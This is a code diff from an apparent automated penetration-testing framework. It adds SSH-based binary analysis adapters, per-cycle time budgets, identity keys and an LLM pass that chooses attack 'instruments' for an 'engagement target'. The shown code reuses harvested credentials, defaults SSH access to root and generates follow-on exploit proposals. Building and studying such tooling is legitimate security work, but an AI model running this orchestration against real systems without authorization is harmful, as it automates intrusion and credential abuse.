+        now_ts = datetime.now(timezone.utc).isoformat()
+        return _gravity_precondition_event(
+            source_id="gravity.binary_analysis",
+            toolchain="skg-binary-toolchain",
+            wicket_id=wid,
+            status=status,
+            workload_id=workload_id,
+            target_ip=ip,
+            detail=detail[:400],
+            evidence_rank=rank,
+            source_kind="binary_scanner",
+            pointer=f"ssh://{ip}",
+            confidence=conf,
+            run_id=run_id,
+            attack_path_id=attack_path_id,
+            domain="binary",
+            version="0.1.0",
+            ts=now_ts,
+            extra_payload={"observed_at": now_ts},
+        )
 
     def _ssh_attempts():
         seen = set()
@@ -4365,6 +5526,112 @@ def _exec_binary_analysis(ip, target, run_id, out_dir, result):
     return result
 
 
+def _exec_toolchain_adapter(
+    adapter_name: str,
+    module_key: str,
+    adapter_subpath: str,
+    attack_path_id: str,
+    label: str,
+    ip: str,
+    target: dict,
+    run_id: str,
+    out_dir,
+    result: dict,
+    *,
+    authorized: bool = False,
+) -> dict:
+    """
+    Generic SSH-based toolchain adapter runner.  Loads parse.py from
+    skg-binary-toolchain/adapters/<adapter_subpath>, calls run(), writes NDJSON,
+    projects events.  Used by capa_analysis, angr_symbolic, and frida_trace.
+    """
+    ssh_target = None
+    for t in (target if isinstance(target, list) else [target]):
+        if isinstance(t, dict) and (t.get("ssh_port") or t.get("user") or t.get("username")):
+            ssh_target = t
+            break
+    if ssh_target is None and isinstance(target, dict):
+        ssh_target = target
+
+    if not ssh_target:
+        result.setdefault("error", f"{label}: no SSH target")
+        return result
+
+    adapter_path = SKG_HOME / "skg-binary-toolchain" / "adapters" / adapter_subpath / "parse.py"
+    if not adapter_path.exists():
+        result.setdefault("error", f"{label}: adapter not found at {adapter_path}")
+        return result
+
+    try:
+        mod = _load_module_from_file(module_key, adapter_path)
+        ssh_user = ssh_target.get("user") or ssh_target.get("username") or "root"
+        ssh_pass = ssh_target.get("password") or None
+        ssh_key  = ssh_target.get("key") or None
+        ssh_port = int(ssh_target.get("ssh_port") or ssh_target.get("port") or 22)
+
+        run_kwargs: dict = dict(
+            host=ip, ssh_port=ssh_port, user=ssh_user,
+            password=ssh_pass, key=ssh_key,
+            workload_id=f"binary::{ip}", run_id=run_id,
+            attack_path_id=attack_path_id,
+        )
+        if authorized:
+            run_kwargs["authorized"] = True
+
+        events = mod.run(**run_kwargs)
+        if not events:
+            return result
+
+        ev_file = (Path(out_dir) if out_dir else SKG_STATE_DIR / "gravity") / \
+                  f"gravity_{adapter_name}_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
+        ev_file.parent.mkdir(parents=True, exist_ok=True)
+        with ev_file.open("w") as fh:
+            for ev in events:
+                fh.write(json.dumps(ev) + "\n")
+
+        r = sum(1 for e in events if e.get("payload", {}).get("status") == "realized")
+        b = sum(1 for e in events if e.get("payload", {}).get("status") == "blocked")
+        result["success"]     = True
+        result["events"]      = len(events)
+        result["events_file"] = str(ev_file)
+        _project_gravity_events(str(ev_file), run_id, result)
+        print(f"    [{label}] {ip}: {len(events)} events (R={r} B={b}) → {ev_file.name}")
+
+    except Exception as exc:
+        result.setdefault("error", f"{label}: {exc!s:.200}")
+        print(f"    [{label}] {ip}: failed — {exc}")
+
+    return result
+
+
+def _exec_capa_analysis(ip, target, run_id, out_dir, result):
+    """Binary capability + ATT&CK technique detection via capa (BA-07, BA-08)."""
+    return _exec_toolchain_adapter(
+        "capa", "skg_capa_analysis", "capa_analysis",
+        "binary_offensive_capability_v1", "CAPA",
+        ip, target, run_id, out_dir, result,
+    )
+
+
+def _exec_angr_symbolic(ip, target, run_id, out_dir, result):
+    """angr symbolic execution confirmation of dangerous call reachability (BA-09)."""
+    return _exec_toolchain_adapter(
+        "angr", "skg_angr_symbolic", "angr_symbolic",
+        "binary_symbolic_confirmed_v1", "ANGR",
+        ip, target, run_id, out_dir, result,
+    )
+
+
+def _exec_frida_trace(ip, target, run_id, out_dir, result, authorized=False):
+    """Frida runtime hook interception of dangerous calls (BA-10). Requires authorized=True."""
+    return _exec_toolchain_adapter(
+        "frida", "skg_frida_trace", "frida_trace",
+        "binary_runtime_confirmed_v1", "FRIDA",
+        ip, target, run_id, out_dir, result,
+        authorized=authorized,
+    )
+
+
 def _exec_db_discovery(ip, target, run_id, out_dir, result):
     """
     SSH-based database service discovery and exposure assessment.
@@ -4409,8 +5676,7 @@ def _exec_db_discovery(ip, target, run_id, out_dir, result):
     # Collect harvested credentials from the SKG state store (HO-18)
     harvested: list[dict] = []
     try:
-        from skg.kernel.observations import load_wicket_states as _lws
-        states = _lws(ip)
+        states = load_wicket_states(ip)
         ho18 = states.get("HO-18") or {}
         raw_creds = ho18.get("detail", "") or ""
         # detail field often contains JSON list or "user:pass" lines
@@ -4703,6 +5969,7 @@ def _exec_sysaudit(ip, target, run_id, out_dir, result):
     result["success"]     = True
     result["events"]      = len(events)
     result["events_file"] = str(ev_file)
+    _project_gravity_events(ev_file, run_id, result)
     return result
 
 
@@ -4859,34 +6126,24 @@ def _exec_data_profiler(ip, target, run_id, out_dir, result):
 
     def _connectivity_event(kind: str, workload_id: str, detail: str) -> dict:
         now = iso_now()
-        return {
-            "id": str(uuid.uuid4()),
-            "ts": now,
-            "type": "obs.attack.precondition",
-            "source": {
-                "source_id": "adapter.db_profiler",
-                "toolchain": "skg-data-toolchain",
-                "version": "0.1.0",
-            },
-            "payload": {
-                "wicket_id": "DP-10",
-                "status": "realized",
-                "workload_id": workload_id,
-                "target_ip": ip,
-                "detail": detail,
-                "run_id": run_id,
-                "observed_at": now,
-            },
-            "provenance": {
-                "evidence_rank": 4,
-                "evidence": {
-                    "source_kind": "db_profiler_runtime",
-                    "pointer": workload_id,
-                    "collected_at": now,
-                    "confidence": 0.95,
-                },
-            },
-        }
+        return _gravity_precondition_event(
+            source_id="adapter.db_profiler",
+            toolchain="skg-data-toolchain",
+            wicket_id="DP-10",
+            status="realized",
+            workload_id=workload_id,
+            target_ip=ip,
+            detail=detail,
+            evidence_rank=4,
+            source_kind="db_profiler_runtime",
+            pointer=workload_id,
+            confidence=0.95,
+            run_id=run_id,
+            domain="data",
+            version="0.1.0",
+            ts=now,
+            extra_payload={"observed_at": now},
+        )
 
     for src in data_sources:
         url         = src.get("url", "")
@@ -5026,104 +6283,6 @@ def _exec_data_profiler(ip, target, run_id, out_dir, result):
     return result
 
 
-
-    """
-    Collect the AD domain graph from BloodHound CE and emit AD wicket events.
-
-    BloodHound sees the whole domain, not just one host — so we use the
-    domain_sid from skg_config.yaml to scope which domain this target belongs
-    to, then run the full BH collection.  Events are written to out_dir with
-    target_ip = ip so load_wicket_states() picks them up for this target's
-    entropy calculation.
-
-    The AD wickets this resolves (kerberoastable, delegation, stale DAs,
-    LAPS gaps, password-in-description, ACL abuses, domain properties)
-    are all read from the BH object graph — no agent on the target needed.
-
-    Falls back to Neo4j bolt if the BH CE REST API is unreachable.
-    """
-    import sys as _sys
-    import os as _os
-
-    bh_url   = _os.environ.get("BH_URL",      "http://localhost:8080")
-    bh_user  = _os.environ.get("BH_USERNAME", "admin")
-    bh_pass  = _os.environ.get("BH_PASSWORD", "")
-    neo4j_url  = _os.environ.get("NEO4J_URL",      "bolt://localhost:7687")
-    neo4j_user = _os.environ.get("NEO4J_USER",     "neo4j")
-    neo4j_pass = _os.environ.get("NEO4J_PASSWORD", "")
-
-    # Infer workload_id — use domain (from target domains list) or IP
-    domains_for_target = target.get("domains", [])
-    workload_id = next(
-        (d for d in domains_for_target if "ad" in d.lower()),
-        f"ad::{ip}"
-    )
-    attack_path_id = "ad_kerberoast_v1"
-
-    print(f"    [BH] Collecting AD graph from {bh_url} for workload {workload_id}...")
-
-    try:
-        if str(REPO_ROOT) not in _sys.path:
-            _sys.path.insert(0, str(REPO_ROOT))
-        from skg.sensors.bloodhound_sensor import (
-            BloodHoundCEClient, Neo4jClient,
-            collect_via_api, collect_via_neo4j,
-            write_bh_dir,
-        )
-        from skg.sensors.adapter_runner import run_bloodhound
-        from skg.core.paths import SKG_STATE_DIR
-    except ImportError as exc:
-        result["error"] = f"BloodHound sensor import failed: {exc}"
-        return result
-
-    data = None
-
-    if bh_pass:
-        try:
-            client = BloodHoundCEClient(bh_url, bh_user, bh_pass)
-            data = collect_via_api(client)
-        except Exception as exc:
-            print(f"    [BH] CE API failed ({exc}), trying Neo4j...")
-
-    if data is None and neo4j_pass:
-        try:
-            client = Neo4jClient(neo4j_url, neo4j_user, neo4j_pass)
-            data = collect_via_neo4j(client)
-            client.close()
-        except Exception as exc:
-            result["error"] = f"Neo4j also unavailable: {exc}"
-            return result
-
-    if data is None:
-        result["error"] = "No BloodHound source reachable (set BH_PASSWORD or NEO4J_PASSWORD)"
-        return result
-
-    # Write normalized BH data and run the adapter
-    bh_dir = SKG_STATE_DIR / "bh_cache" / run_id[:8]
-    write_bh_dir(data, bh_dir)
-
-    try:
-        events = run_bloodhound(bh_dir, workload_id, attack_path_id, run_id)
-    except Exception as exc:
-        result["error"] = f"BloodHound adapter failed: {exc}"
-        return result
-
-    # Write events to gravity output dir with target_ip stamped
-    events_file = out_dir / f"gravity_bh_{ip}_{run_id[:8]}.ndjson"
-    if events:
-        with open(events_file, "w") as fh:
-            for ev in events:
-                ev.setdefault("payload", {})["target_ip"] = ip
-                fh.write(json.dumps(ev) + "\n")
-
-    result["success"]     = True
-    result["events"]      = len(events)
-    result["events_file"] = str(events_file)
-    print(f"    [BH]  {workload_id}: {len(events)} AD wicket events → {events_file.name}")
-
-    return result
-
-
 def _exec_ssh_sensor(ip, target, run_id, out_dir, result):
     """
     Run the SSH sensor against the target.
@@ -5193,6 +6352,19 @@ def _exec_ssh_sensor(ip, target, run_id, out_dir, result):
         "label": "agent",
     })
 
+    # Probe SSH port connectivity before attempting credential-based access.
+    # Avoids paramiko hanging on filtered ports and emits a clean blocked event.
+    _ssh_probe_port = 22
+    try:
+        import socket as _sock
+        with _sock.create_connection((ip, _ssh_probe_port), timeout=5):
+            pass
+    except (OSError, ConnectionRefusedError):
+        result["error"] = f"SSH port {_ssh_probe_port} not reachable on {ip}"
+        return result
+    except Exception:
+        pass  # Unexpected probe error; proceed and let paramiko surface it
+
     client = None
     last_exc = None
     used = None
@@ -5250,21 +6422,22 @@ def _exec_ssh_sensor(ip, target, run_id, out_dir, result):
     events_file = out_dir / f"gravity_ssh_{ip}_{run_id[:8]}.ndjson"
 
     try:
-        # Import and run the host toolchain adapter directly
         if str(REPO_ROOT) not in _sys.path:
             _sys.path.insert(0, str(REPO_ROOT))
-        from skg.sensors.adapter_runner import run_ssh_host
-        events = run_ssh_host(
-            client, ip, workload_id, attack_path_id, run_id,
-            out_file=events_file, user=user,
+        from skg_services.gravity.host_runtime import collect_ssh_session_assessment_to_file
+
+        events = collect_ssh_session_assessment_to_file(
+            client,
+            host=ip,
+            out_path=events_file,
+            attack_path_id=attack_path_id,
+            run_id=run_id,
+            workload_id=workload_id,
+            username=user,
             auth_type="key" if key else "password",
             port=port,
         )
-        # Write events to the gravity output directory
-        if events:
-            with open(events_file, "a") as fh:
-                for ev in events:
-                    fh.write(json.dumps(ev) + "\n")
+
         result["success"] = True
         result["events_file"] = str(events_file)
         _project_gravity_events(events_file, run_id, result)
@@ -5420,6 +6593,12 @@ def _collect_observation_refs(results: dict) -> list[str]:
 def _collect_observation_confirms(results: dict, target_ip: str) -> list[dict]:
     confirms = []
     seen = set()
+    target_identity = str(parse_workload_ref(target_ip).get("identity_key") or target_ip).strip()
+    target_aliases = {
+        str(target_ip or "").strip(),
+        target_identity,
+    }
+    target_aliases.discard("")
     for res in results.values():
         if not isinstance(res, dict):
             continue
@@ -5449,10 +6628,13 @@ def _collect_observation_confirms(results: dict, target_ip: str) -> list[dict]:
                     wicket_id = payload.get("wicket_id")
                     status = payload.get("status")
                     workload_id = payload.get("workload_id", "")
-                    ev_target = payload.get("target_ip") or workload_id.split("::")[-1]
+                    ev_identity = str(parse_workload_ref(workload_id).get("identity_key") or "").strip()
+                    ev_target = str(payload.get("target_ip") or ev_identity or "").strip()
                     if not wicket_id or status not in {"realized", "blocked"}:
                         continue
-                    if ev_target and ev_target != target_ip:
+                    ev_aliases = {ev_target, ev_identity, workload_id}
+                    ev_aliases.discard("")
+                    if ev_aliases and not (ev_aliases & target_aliases):
                         continue
                     evidence = ev.get("provenance", {}).get("evidence", {})
                     key = (workload_id, wicket_id, status, evidence.get("pointer", ""))
@@ -5461,7 +6643,8 @@ def _collect_observation_confirms(results: dict, target_ip: str) -> list[dict]:
                     seen.add(key)
                     confirms.append({
                         "target_ip": target_ip,
-                        "workload_id": workload_id or f"gravity::{target_ip}",
+                        "identity_key": target_identity or target_ip,
+                        "workload_id": workload_id or f"gravity::{target_identity or target_ip}",
                         "wicket_id": wicket_id,
                         "status": status,
                         "attack_path_id": payload.get("attack_path_id", ""),
@@ -5709,6 +6892,7 @@ def _llm_select_instruments(
     E        = t.get("entropy", 0.0)
     n_unknown = len(unknown)
     n_realized = len(realized)
+    tool_block = _observed_tool_summary(t.get("view_state") or {})
 
     # Recent analyst output (if AI already ran)
     analyst_ctx = ""
@@ -5735,6 +6919,7 @@ def _llm_select_instruments(
             f"TARGET: {ip}  OS: {os_hint}  Domains: {domains or 'none yet'}\n"
             f"Field entropy: {E:.1f}  ({n_unknown} unknown wickets, {n_realized} realized)\n\n"
             f"OPEN SERVICES:\n{svc_block}\n\n"
+            f"OBSERVED NODE-LOCAL TOOLS:\n  {tool_block}\n\n"
             f"CONFIRMED wickets: {', '.join(realized[:15]) or 'none'}\n"
             f"TOP UNKNOWN: {', '.join(unknown[:12]) or 'none'}\n\n"
             f"FOLDS (structural gaps):\n{fold_block}\n\n"
@@ -5768,6 +6953,7 @@ def _llm_select_instruments(
         # Small models (TinyLlama) complete the suffix rather than generating preamble
         prompt = (
             f"Engagement target {ip}. Services: {svc_short}.\n"
+            f"Observed node-local tools: {tool_block}.\n"
             f"Instruments available: {instr_short}.\n"
             f"{smb_hint}{web_hint}{ssh_hint}{no_svc_hint}"
             f"Run:"
@@ -5872,10 +7058,11 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
     if not surface:
         surface = json.loads(Path(surface_path).read_text())
     surface = _merge_configured_targets(surface)
+    view_state_by_identity = _load_fresh_view_state()
+    subject_rows = _gravity_subject_rows(surface, view_state_by_identity, focus_target=focus_target)
     if focus_target:
-        targets = [t for t in surface.get("targets", []) if t.get("ip") == focus_target]
-        if not targets:
-            print(f"  [TARGET] {focus_target} not present in surface")
+        if not subject_rows:
+            print(f"  [TARGET] {focus_target} not present in measured surface or target shell")
             return {
                 "cycle": cycle_num,
                 "actions_taken": 0,
@@ -5885,8 +7072,6 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
                 "total_folds": 0,
                 "fold_boost": 0.0,
             }
-        surface = dict(surface)
-        surface["targets"] = targets
     out_path = Path(out_dir)
     out_path.mkdir(parents=True, exist_ok=True)
     run_id = str(uuid.uuid4())
@@ -5935,25 +7120,36 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
     for wids in domain_wickets.values():
         all_wickets.update(wids)
 
+    _cycle_wall_start = time.monotonic()
+    # Total wall budget for instrument execution within this cycle.
+    # Pre-instrument work (fold detection, topology, proposals) uses ~30s;
+    # this leaves the remainder for actual scanning.
+    _CYCLE_INSTRUMENT_BUDGET = 240.0  # seconds per cycle
+
     print(f"\n{'='*70}")
     print(f"  GRAVITY FIELD — CYCLE {cycle_num}")
     print(f"  {iso_now()}")
     print(f"{'='*70}")
-    if focus_target and surface.get("targets"):
-        _t = surface["targets"][0]
+    if focus_target and subject_rows:
+        _subject = subject_rows[0]
+        _t = _subject.get("target") or {}
+        _view = _subject.get("view_state") or {}
         _svcs = ", ".join(
             f"{s.get('port')}/{s.get('service')}" for s in _t.get("services", [])[:12]
         ) or "unknown"
-        _domains = ", ".join(_t.get("domains", [])) or "none"
+        _domains = ", ".join(_view.get("measured_domains") or _t.get("domains", [])) or "none"
+        _tools = _observed_tool_summary(_view)
         _cls = _t.get("kind") or _t.get("os") or "unknown"
         print(f"  [TARGET] {focus_target}  class={_cls}")
         print(f"  [SERVICES] {_svcs}")
         print(f"  [DOMAINS ] {_domains}")
+        if _tools != "none":
+            print(f"  [TOOLS   ] {_tools}")
 
     # ── Run FoldDetector ─────────────────────────────────────────────────────
     # Build per-IP fold map before entropy calculation so folds
     # are included in E for each target.
-    fold_manager_by_ip: dict[str, object] = _load_persisted_fold_managers(Path(out_dir) / "folds")
+    fold_manager_by_identity: dict[str, object] = _load_persisted_fold_managers(Path(out_dir) / "folds")
     try:
         from skg.kernel.folds import FoldDetector, FoldManager
         detector = FoldDetector()
@@ -5962,30 +7158,23 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
             cve_dir=CVE_DIR,
             toolchain_dir=SKG_HOME,
         )
-        # Group folds by IP — location is workload_id which contains IP
+        # Group folds by identity key so measured manifestations and shell metadata
+        # attach to the same subject even when locations differ.
         for fold in all_new_folds:
-            # Extract IP from location strings like "ssh::172.17.0.2",
-            # "cve::172.17.0.2", or raw workload_id
-            loc = fold.location
-            ip_match = None
-            for target in surface.get("targets", []):
-                tip = target["ip"]
-                if tip in loc or loc.endswith(tip):
-                    ip_match = tip
-                    break
-            if ip_match:
-                if ip_match not in fold_manager_by_ip:
-                    fold_manager_by_ip[ip_match] = FoldManager()
-                fold_manager_by_ip[ip_match].add(fold)
+            identity_key = _fold_identity_key(fold)
+            if identity_key:
+                if identity_key not in fold_manager_by_identity:
+                    fold_manager_by_identity[identity_key] = FoldManager()
+                fold_manager_by_identity[identity_key].add(fold)
 
         # Report fold summary
         total_folds = sum(
-            len(fm.all()) for fm in fold_manager_by_ip.values()
+            len(fm.all()) for fm in fold_manager_by_identity.values()
         )
         if total_folds > 0:
             print(f"\n  [FOLDS] {total_folds} active folds detected:")
             fold_counts: dict[str, int] = {}
-            for fm in fold_manager_by_ip.values():
+            for fm in fold_manager_by_identity.values():
                 for f in fm.all():
                     fold_counts[f.fold_type] = fold_counts.get(f.fold_type, 0) + 1
             for ft, count in sorted(fold_counts.items()):
@@ -5996,11 +7185,11 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
 
     except Exception as exc:
         reporter.emit("fold_detector", f"FoldDetector unavailable: {exc}", exc=exc)
-        fold_manager_by_ip = {}
+        fold_manager_by_identity = {}
 
     try:
         created_toolchain_proposals = _create_toolchain_proposals_from_folds(
-            fold_manager_by_ip, surface_path
+            fold_manager_by_identity, surface_path
         )
         if created_toolchain_proposals:
             print(f"\n  [FORGE] {len(created_toolchain_proposals)} toolchain proposal(s) created from folds:")
@@ -6011,7 +7200,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
 
     try:
         created_catalog_growth = _create_catalog_growth_proposals_from_folds(
-            fold_manager_by_ip
+            fold_manager_by_identity
         )
         if created_catalog_growth:
             print(f"\n  [FORGE] {len(created_catalog_growth)} catalog growth proposal(s) created from folds:")
@@ -6044,7 +7233,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
         sphere_persistence = {}
         fiber_clusters_by_anchor = {}
 
-    # ── Expire stale pending proposals (older than 30 min) ─────────────────
+    # ── Expire stale pending proposals (older than 4 hours) ──────────────────
     # Prevents MSF dedup from blocking on proposals that were never actioned.
     _proposals_dir = SKG_STATE_DIR / "proposals"
     if _proposals_dir.exists():
@@ -6063,19 +7252,52 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
             except Exception:
                 pass
 
+    # ── Prune old event files (older than 30 days) ─────────────────────────
+    # Prevents temporal fold accumulation from stale observations.
+    # CVE feed files are retained longer (90 days) since they represent
+    # NVD state, not per-target sensor observations.
+    try:
+        _event_cutoff = datetime.now(timezone.utc) - timedelta(days=30)
+        _cve_cutoff   = datetime.now(timezone.utc) - timedelta(days=90)
+        _pruned_events = 0
+        for _ef in EVENTS_DIR.glob("*.ndjson"):
+            try:
+                _mtime = datetime.fromtimestamp(_ef.stat().st_mtime, tz=timezone.utc)
+                _cutoff = _cve_cutoff if _ef.name.startswith("cve_") else _event_cutoff
+                if _mtime < _cutoff:
+                    _ef.unlink(missing_ok=True)
+                    _pruned_events += 1
+            except Exception:
+                pass
+        if _pruned_events > 0:
+            print(f"  [CLEANUP] Pruned {_pruned_events} stale event file(s) (>30 days old)")
+    except Exception as _pe:
+        log.debug(f"[cleanup] event pruning failed: {_pe}")
+
     # ── Compute entropy landscape ──
     print("\n  [FIELD] Computing entropy landscape...\n")
 
     landscape = []
-    for target in surface.get("targets", []):
-        ip = target["ip"]
-        states = load_wicket_states(ip)
+    for subject in subject_rows:
+        identity_key = subject["identity_key"]
+        ip = subject["ip"]
+        target = dict(subject.get("target") or {})
+        view_state = dict(subject.get("view_state") or summarize_view_nodes([], identity_key=identity_key))
+        states = load_wicket_states(identity_key)
+
+        # Mirror state to SQLite for fast queries
+        if _state_db is not None:
+            try:
+                _state_db.bulk_upsert_wickets(identity_key, states)
+            except Exception:
+                pass
 
         # Determine applicable wickets from observed domains and service hints.
         effective_domains = derive_effective_domains(
             target,
             ip=ip,
             discovery_dir=DISCOVERY_DIR,
+            view_state=view_state,
         )
         applicable = applicable_wickets_for_domains(effective_domains, domain_wickets)
 
@@ -6129,12 +7351,12 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
         # energy between domains that E_base misses. Log-scaled to keep it
         # proportional: a target with L_F=1000 gets ~0.7 more pull than L_F=0.
         # E = E_base + Σ fold.gravity_weight() + bounded field pull + γ·log1p(L_F/10)
-        fold_manager  = fold_manager_by_ip.get(ip)
+        fold_manager  = fold_manager_by_identity.get(identity_key)
         fold_boost    = fold_manager.total_gravity_weight() if fold_manager else 0.0
         # Paper 4 L(F) field functional — compute here so L_F_boost can use it
         L_F = 0.0
         try:
-            L_F = _kernel.L_field_functional(ip)
+            L_F = _kernel.L_field_functional(identity_key)
         except Exception:
             pass
         L_F_boost     = 0.0
@@ -6159,6 +7381,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
             applicable=applicable,
             domain_wickets=domain_wickets,
             discovery_dir=DISCOVERY_DIR,
+            has_measured_view=bool(int(view_state.get("view_count", 0) or 0)),
         )
         if no_nmap_history:
             target["_no_nmap_history"] = True
@@ -6172,6 +7395,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
         # Used to modulate instrument selection: low R → amplify potential.
         R_per_sphere: dict = {}
         try:
+            from skg.topology.energy import field_spheres_for_domains
             from skg.topology.kuramoto import build_oscillators, _order_parameter_per_sphere
             osc = build_oscillators(EVENTS_DIR, INTERP_DIR)
             # Filter to oscillators relevant to this target
@@ -6180,14 +7404,8 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
                               o.wicket_id in applicable
                           )] if osc else []
             if not target_osc:
-                # Fall back to all oscillators with sphere matching this target's domains
-                target_spheres = set()
-                for d in effective_domains:
-                    if d == "web": target_spheres.add("web")
-                    elif d == "host": target_spheres.add("host")
-                    elif d == "data": target_spheres.add("data")
-                    elif d == "container": target_spheres.add("container")
-                    elif d == "ad_lateral": target_spheres.add("ad_lateral")
+                # Fall back to all oscillators with sphere matching the target's domains.
+                target_spheres = set(field_spheres_for_domains(sorted(effective_domains)))
                 target_osc = [o for o in osc if getattr(o, 'sphere', '') in target_spheres]
             if target_osc:
                 R_per_sphere = _order_parameter_per_sphere(target_osc)
@@ -6196,6 +7414,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
 
         landscape.append({
             "ip": ip,
+            "identity_key":      identity_key,
             "entropy":           E,
             "E_base":            E_base,
             "fold_boost":        fold_boost,
@@ -6211,6 +7430,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
             "domains":           sorted(effective_domains),
             "services":          target.get("services", []),
             "target":            target,
+            "view_state":        view_state,
             "fold_manager":      fold_manager,
             "R_per_sphere":      R_per_sphere,   # Kuramoto order parameter
             "L_F":               L_F,             # Paper 4 field functional
@@ -6283,6 +7503,9 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
         if t["entropy"] == 0 and not t["target"].get("_no_nmap_history"):
             continue  # Fully determined — no gravitational pull
 
+        # node_key = stable identity for this node (the scheduling primitive).
+        # ip = routable address — used only for network instrument execution and file patterns.
+        node_key = str(t.get("identity_key") or t["ip"]).strip()
         ip = t["ip"]
         fold_note  = (f", {t['n_folds']} folds (+{t['fold_boost']:.1f})"
                       if t['n_folds'] > 0 else "")
@@ -6292,7 +7515,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
                       if t.get("L_F_boost", 0.0) > 0 else "")
         wg_note    = (f", K⊗ (+{t['wgraph_boost']:.2f})"
                       if t.get("wgraph_boost", 0.0) > 0.01 else "")
-        print(f"  → {ip} (E={t['entropy']:.2f}, "
+        print(f"  → {node_key} (E={t['entropy']:.2f}, "
               f"{t['unknowns']} unknowns{fold_note}{field_note}{lf_note}{wg_note})")
         # Show top wicket graph signals if any
         wg_boosts = t.get("wgraph_boosts", {})
@@ -6312,7 +7535,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
                       f"{_dh['domain']:20s}  {_dh['label'] or _dh['wicket_id']}"
                       f"{_capable_str}")
 
-        candidates, cold_start_target = rank_instruments_for_target(
+        candidates, cold_start_target = rank_instruments_for_node(
             target_row=t,
             instruments=instruments,
             focus_target=focus_target,
@@ -6332,12 +7555,8 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
 
         # ── Gravity-primary selection ─────────────────────────────────────
         # Gravity computes potential scores — that IS the selection mechanism.
-        # The LLM's role is analyst (reads observations, emits hypotheses that
-        # update the field), not selector (the field selects, not the LLM).
-        #
-        # Cold / high-entropy target: run a broad bootstrap sweep so the field
-        # gets enough signal to compute meaningful potentials next cycle.
-        # Warm target: run the top gravity-ranked instruments concurrently.
+        # The LLM reads the gravity context and can augment selection on warm
+        # targets (cold start: bootstrap sweep always runs without LLM overhead).
         to_run, serial_item, selected_items = choose_instruments_for_target(
             candidates=candidates,
             instruments=instruments,
@@ -6347,6 +7566,47 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
             interactive=sys.stdin.isatty(),
             print_fn=print,
         )
+
+        # ── LLM advisory pass (warm targets only) ─────────────────────────
+        # After gravity computes the selection, ask the LLM if it agrees.
+        # On warm targets the LLM has enough context to be useful; on cold
+        # targets the bootstrap sweep runs regardless.  The LLM can reorder
+        # or augment from the full candidate set but cannot remove instruments
+        # that physics scored above the LLM's suggestions.
+        # Falls back to gravity selection if no LLM is available.
+        if not cold_start_target and candidates:
+            # Run LLM selection in a thread with a 45-second wall-clock budget.
+            # If Ollama is slow or unresponsive, fall back to gravity selection.
+            import threading as _threading
+            _llm_result_box: list = []
+            def _llm_worker():
+                try:
+                    r = _llm_select_instruments(
+                        t, candidates, instruments, authorized=authorized, max_instruments=6
+                    )
+                    _llm_result_box.append(r)
+                except Exception:
+                    _llm_result_box.append(None)
+            _llm_thread = _threading.Thread(target=_llm_worker, daemon=True)
+            _llm_thread.start()
+            _llm_thread.join(timeout=45.0)
+            _llm_selection = _llm_result_box[0] if _llm_result_box else None
+            if _llm_thread.is_alive():
+                print(f"  [LLM-SELECT] {ip}: Ollama timed out (45s) — using gravity selection")
+            if _llm_selection:
+                # Merge: keep any gravity-top instruments the LLM didn't include,
+                # then append LLM additions from the wider candidate set.
+                gravity_names = {n for _, n, _ in to_run}
+                llm_names     = {n for _, n, _ in _llm_selection}
+                # Instruments in both → keep gravity ordering for them
+                merged = list(to_run)
+                for item in _llm_selection:
+                    if item[1] not in gravity_names:
+                        merged.append(item)
+                to_run         = merged
+                selected_items = list(to_run)
+                if serial_item:
+                    selected_items.append(serial_item)
 
         if not selected_items:
             print(f"    No instruments selected")
@@ -6368,14 +7628,40 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
 
         concurrent_results = {}
         if to_run:
+            _elapsed = time.monotonic() - _cycle_wall_start
+            _budget_remaining = max(30.0, _CYCLE_INSTRUMENT_BUDGET - _elapsed)
             with ThreadPoolExecutor(max_workers=MAX_CONCURRENT) as pool:
                 futures = {pool.submit(_run_one, item): item[1] for item in to_run}
-                for future in as_completed(futures):
-                    name, res = future.result()
-                    concurrent_results[name] = res
+                from concurrent.futures import TimeoutError as _FutureTimeout
+                try:
+                    for future in as_completed(futures, timeout=_budget_remaining):
+                        name, res = future.result()
+                        concurrent_results[name] = res
+                except _FutureTimeout:
+                    for future, name in list(futures.items()):
+                        if future.done():
+                            try:
+                                n, r = future.result(timeout=0)
+                                concurrent_results[n] = r
+                            except Exception:
+                                pass
+                        else:
+                            future.cancel()
+                            concurrent_results[name] = {
+                                "instrument": name, "success": False,
+                                "error": "cycle budget exceeded",
+                            }
+                    print(f"  [EXEC] Instrument budget exhausted — remaining instruments cancelled")
         if serial_item:
-            name, res = _run_one(serial_item)
-            concurrent_results[name] = res
+            _elapsed2 = time.monotonic() - _cycle_wall_start
+            if _elapsed2 < _CYCLE_INSTRUMENT_BUDGET:
+                name, res = _run_one(serial_item)
+                concurrent_results[name] = res
+            else:
+                concurrent_results[serial_item[1]] = {
+                    "instrument": serial_item[1], "success": False,
+                    "error": "cycle budget exceeded",
+                }
 
         # Generate follow-on exploit proposals in the main thread after the
         # instrument sweep so interactive review behaves cleanly.
@@ -6391,6 +7677,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
             emit_follow_on_proposals(
                 concurrent_results=concurrent_results,
                 ip=ip,
+                node_key=node_key,
                 out_path=out_path,
                 run_id=run_id,
                 load_wicket_states=load_wicket_states,
@@ -6408,6 +7695,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
         if AUXILIARY_MAP and _get_lhost is not None:
             emit_auxiliary_proposals(
                 ip=ip,
+                node_key=node_key,
                 target=t["target"],
                 run_id=run_id,
                 out_path=out_path,
